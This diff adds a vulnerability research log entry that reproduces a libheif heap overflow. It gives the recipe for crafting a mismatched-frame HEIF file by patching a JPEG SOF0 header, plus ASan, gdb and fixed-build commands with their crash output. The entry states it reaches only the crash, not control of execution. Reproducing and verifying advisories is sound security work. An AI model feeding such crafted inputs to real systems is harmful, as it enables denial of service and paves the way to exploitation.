@@ -810,3 +810,85 @@ or witness verdict. Trailing whitespace on the ASan legend line and gdb
 mapping lines was stripped while capturing those three logs to satisfy
 `git diff --check`; all diagnostic content is otherwise verbatim.
 Grade remains rung 3 plus rung 4, NOT rung 5.
+
+## W183 genuine 512x72 first frame at 36,879 bytes (2026-11-24)
+
+Question: W181's 36,879-byte region came from a 512x72 first frame whose SOF0
+was patched from a 64-row JPEG, so rows 64..71 were libjpeg filler. Does a
+file with a genuinely 72-row first frame still produce the advisory's
+allocation size and fault mode? No rebuild: the committed W161 pinned
+v1.23.6 ASan/plain build trees and the fixed-pin source tree were reused.
+
+Sources: two identical 593-byte grayscale JPEGs, 512x72, PIL 10.2.0 quality 5,
+4:4:4 (`subsampling=0`), `optimize=True`, each row `y` filled with
+`(32 + (y % 8) * 16) & 0xff`, SHA-256
+`652723cd946477e810afb4c1b60d6cac05d6e65c25c3e6a95c6377506675969a`.
+The pinned plain `heif-enc -S --jpeg f0.jpg f1.jpg -o ref.heif` wrote an
+8,102-byte reference (SHA-256
+`24c5906bd508988d3eafa3af73c4f86e0fa4157bb4a89d1bb1dd7e32e07da80e`).
+`neighbour/make_genuine_72_sequence.py` asserts both JPEG hashes, reruns that
+heif-enc command, asserts the reference hash, locates the second JPEG in the
+last `mdat`, patches its SOF0 from (H=72,W=512) to (H=512,W=64) and writes the
+8,102-byte `mixed.heif` SHA-256
+`5a39f4885b8ae4d67754e96a983af5237e1af6acc51d8092efb073cbc0586a53`.
+Replay from the committed evidence directory with
+`HEIF_ENC=/tmp/libheif2shell-vuln-plain/examples/heif-enc` reproduced both
+hashes exactly.
+
+Commands (evidence under `neighbour/evidence/genuine-72/`):
+
+```
+cd neighbour/evidence/genuine-72
+ASAN_OPTIONS=detect_leaks=0 /tmp/libheif2shell-reencode-vuln \
+  mixed.heif out-asan.heif > asan-mixed.out 2>&1   # rc 1
+ASAN_OPTIONS=detect_leaks=0 /tmp/libheif2shell-reencode-vuln \
+  ref.heif out-asan-ref.heif > asan-ref.out 2>&1   # rc 0
+/tmp/libheif2shell-reencode-plain mixed.heif out-plain.heif \
+  > plain-mixed.out 2>&1                           # rc 139
+/tmp/libheif2shell-reencode-plain ref.heif out-plain-ref.heif \
+  > plain-ref.out 2>&1                             # rc 0
+gdb -q -batch -ex run -ex 'bt 8' --args \
+  /tmp/libheif2shell-reencode-plain mixed.heif gdb-out.heif \
+  > gdb-mixed.out 2>&1
+g++ -std=c++17 -g -fsanitize=address -fno-omit-frame-pointer \
+  -I<src>/libheif/api -I/tmp/libheif2shell-fixed-asan \
+  real/reencode_sequence.cc \
+  /tmp/libheif2shell-fixed-asan/libheif/libheif.a \
+  /usr/lib/x86_64-linux-gnu/libx265.so \
+  /usr/lib/x86_64-linux-gnu/libde265.so \
+  /usr/lib/x86_64-linux-gnu/libaom.so \
+  /usr/lib/x86_64-linux-gnu/libjpeg.so \
+  /usr/lib/x86_64-linux-gnu/libtiff.so \
+  /usr/lib/x86_64-linux-gnu/libpng.so \
+  /usr/lib/x86_64-linux-gnu/libz.so \
+  /usr/lib/x86_64-linux-gnu/libwebpmux.so.3.0.13 \
+  /usr/lib/x86_64-linux-gnu/libwebp.so.7.1.8 \
+  /usr/lib/x86_64-linux-gnu/libsharpyuv.so.0.0.1 -ldl \
+  -o /tmp/w183/reencode-fixed
+ASAN_OPTIONS=detect_leaks=0 /tmp/w183/reencode-fixed mixed.heif \
+  fixed2.heif > fixed2-mixed.out 2>&1              # rc 0, encode rc 2
+python3 real/neighbour/check_genuine_72.py neighbour/evidence/genuine-72
+```
+
+Observed: `asan-mixed.out` prints `track declared: 512x72`,
+`frame 0 decoded: 512x72 stride=512`, `frame 1 decoded: 64x512 stride=64`,
+then ASan `WRITE of size 64`, 0 bytes after a **36,879-byte region** at
+pinned `pixelimage.cc:644` via `heif_image.cc:403` and
+`encoder_x265.cc:1139`. No "premature end of data" warning appears for frame
+0: its 72 rows are real entropy-coded image data, unlike W181. `asan-ref.out`
+and `plain-ref.out` show both frames 512x72 encoded, rc 0, no ASan.
+`plain-mixed.out` exits 139; `gdb-mixed.out` places SIGSEGV in
+`__memcpy_avx_unaligned_erms` called from
+`HeifPixelImage::extend_padding_to_size` -> `heif_image_extend_padding_to_size`
+-> `x265_encode_sequence_frame`, so the fault is the OOB store itself, not a
+pointer later consumed by x265. `fixed2-mixed.out` decodes both frames but
+ends with `encode: rc=2 ... All frames of a sequence must have the size of the
+first frame`, no ASan. `check_genuine_72.py` PASS=45 FAIL=0.
+
+Preserved limits: the advisory's 1,155-byte file is still not reproduced; this
+file is 8,102 bytes. The advisory text says a 512x64 first frame, yet both
+W181 and W183 need a 512x72 first frame to obtain the stated 36,879 bytes
+(512*72 + 15). Frame 1's patched SOF encodes 512 rows from a 72-row entropy
+stream, so libjpeg prints "Corrupt JPEG data: 251 extraneous bytes before
+marker 0xd9" before frame 1's decode; the decoder still returns 64x512.
+No pointer, marker, command, consumer, witness replay or rung 5.
